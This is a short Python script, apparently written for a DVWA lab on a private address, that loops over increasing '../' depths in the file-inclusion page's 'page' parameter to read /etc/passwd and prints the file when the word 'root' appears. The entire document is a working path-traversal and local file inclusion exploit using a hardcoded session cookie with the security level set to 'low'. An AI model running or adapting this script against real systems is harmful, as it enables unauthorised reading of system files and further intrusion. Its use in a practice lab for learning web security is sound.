import requests
import re

for i in range(10):
    if(i==0):
        URL="http://10.0.2.13:8080/vulnerabilities/fi/?page="+str('../'*i)+"/etc/passwd"
    else:
        URL="http://10.0.2.13:8080/vulnerabilities/fi/?page="+str('../'*i)+"etc/passwd"

    cookie={
            "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
            "security":"low"
            }

    session1=requests.Session()
        
    req=session1.get(URL,cookies=cookie)

    if(req.text.find("root") != -1):
        print("\n\n")
        print("Crack Success!!")
        print("\n\n")
        result_parse = re.search('.*<!',req.text,re.DOTALL)
        result = re.sub('<!','',result_parse.group(),re.DOTALL)
        print(result)
        print("\n\n")
        exit(0)
    else:
        print("Not Vulnerable")

